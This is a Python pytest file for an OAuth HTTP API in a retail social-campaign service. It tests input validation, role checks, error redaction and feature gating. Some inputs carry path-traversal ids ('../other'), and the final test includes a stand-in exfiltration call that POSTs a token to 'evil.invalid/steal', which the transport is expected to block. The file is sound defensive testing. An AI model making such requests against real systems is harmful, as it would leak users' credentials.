"""Part 2 HTTP OAuth security and feature gating: offline, no cloud writes."""
import base64
import sys
from pathlib import Path
from urllib.parse import parse_qs, urlsplit

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "azure-functions/campaign-api"))
from social_oauth import OAuthDenied
from social_oauth_http import OAuthHTTPAPI, build_oauth_api, google_transport, TOKEN_URL


SHOP = "10000000-0000-4000-8000-000000000001"
USER = "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa"
ACCOUNT = "11111111-1111-4111-8111-111111111111"


class Spy:
    def __init__(self):
        self.calls = []
    def start(self, **kwargs):
        self.calls.append(("start", kwargs))
        return {"authorization_url": "https://accounts.google.com/oauth", "expires_at": "2030-01-01"}
    def complete(self, **kwargs):
        self.calls.append(("complete", kwargs))
        return {"id": ACCOUNT, "connection_status": "CONNECTED"}
    def disconnect(self, **kwargs):
        self.calls.append(("disconnect", kwargs))
        return {"id": ACCOUNT, "connection_status": "DISCONNECTED"}


def test_post_contract_rejects_extra_fields_bad_ids_and_anonymous_requests():
    spy = Spy()
    api = OAuthHTTPAPI(spy)
    assert api.handle("start", "", {"shop_id": SHOP, "provider": "youtube"})[0] == 401
    assert api.handle("start", "Bearer jwt", {"shop_id": SHOP, "provider": "youtube", "secret": "x"})[0] == 400
    assert api.handle("start", "Bearer jwt", {"shop_id": "../other", "provider": "youtube"})[0] == 400
    assert api.handle("complete", "Bearer jwt", {"shop_id": SHOP, "provider": "youtube", "state": "s"})[0] == 400
    assert api.handle("disconnect", "Bearer jwt", {"shop_id": SHOP, "account_id": "../other"})[0] == 400
    assert api.handle("publish", "Bearer jwt", {"shop_id": SHOP})[0] == 404
    assert spy.calls == []


def test_exact_validated_requests_delegate_only_to_lifecycle():
    spy = Spy()
    api = OAuthHTTPAPI(spy)
    assert api.handle("start", "Bearer jwt", {"shop_id": SHOP, "provider": "youtube"})[0] == 200
    assert api.handle("complete", "Bearer jwt", {
        "shop_id": SHOP, "provider": "youtube", "state": "state", "code": "code"})[0] == 200
    assert api.handle("disconnect", "Bearer jwt", {"shop_id": SHOP, "account_id": ACCOUNT})[0] == 200
    assert [method for method, _ in spy.calls] == ["start", "complete", "disconnect"]


def test_sensitive_provider_errors_cannot_reach_browser():
    class Deny:
        def start(self, **kw): raise OAuthDenied("private token=SECRET")
    status, data = OAuthHTTPAPI(Deny()).handle(
        "start", "Bearer jwt", {"shop_id": SHOP, "provider": "youtube"})
    assert status == 403 and data == {"error": "OAUTH_DENIED"}
    assert "SECRET" not in str(data)


def config():
    return {
        "RETAIL_PART2_SOCIAL_ENABLED": "true",
        "RETAIL_PART2_OAUTH_ENABLED": "true",
        "RETAIL_SUPABASE_URL": "https://project.supabase.co",
        "RETAIL_SUPABASE_PUBLISHABLE_KEY": "public",
        "RETAIL_SUPABASE_SERVICE_ROLE_KEY": "test-service-only",
        "RETAIL_PART2_VAULT_KEY_B64": base64.b64encode(b"x"*32).decode(),
        "RETAIL_PART2_VAULT_VERSION": "1",
        "RETAIL_YOUTUBE_CLIENT_ID": "google-client",
        "RETAIL_YOUTUBE_CLIENT_SECRET": "server-only-secret",
        "RETAIL_YOUTUBE_OAUTH_REDIRECT_URI": "https://retail.example/social/oauth/callback/youtube",
    }


class RoleStore:
    def __init__(self, role="OWNER"): self.role=role;self.calls=[]
    def _request(self, table, token, query):
        self.calls.append((table, token, query))
        return [{"shop_id": SHOP, "user_id": USER, "role": self.role}]


class State:
    def __init__(self):self.writes=[]
    def issue(self, **kwargs):self.writes.append(kwargs)


def test_real_owner_from_rls_required_before_state_issue():
    store = RoleStore()
    states = State()
    api = build_oauth_api(config(), transport=lambda *x,**kw:None,
            verifier=lambda token: USER, tenant_store=store, repository=states)
    status, body = api.handle("start", "Bearer user-jwt", {"shop_id": SHOP, "provider": "youtube"})
    assert status == 200
    assert body["authorization_url"].startswith("https://accounts.google.com/")
    assert len(states.writes) == 1
    assert store.calls[0][1] == "user-jwt"
    assert "server-only-secret" not in repr(body)
    store.role = "EDITOR"
    status, _ = api.handle("start", "Bearer user-jwt", {"shop_id": SHOP, "provider": "youtube"})
    assert status == 403 and len(states.writes) == 1


def test_disabled_or_invalid_vault_denies_build():
    conf = config()
    conf["RETAIL_PART2_OAUTH_ENABLED"] = "false"
    with pytest.raises(OAuthDenied): build_oauth_api(conf)
    conf = config()
    conf["RETAIL_PART2_VAULT_KEY_B64"] = base64.b64encode(b"short").decode()
    with pytest.raises(OAuthDenied): build_oauth_api(conf)


def test_provider_transport_is_fixed_target_before_any_network():
    with pytest.raises(OAuthDenied):
        google_transport("POST", "https://evil.invalid/steal", form={"token": "secret"})
    with pytest.raises(OAuthDenied):
        google_transport("GET", TOKEN_URL, params={"x":"x"})
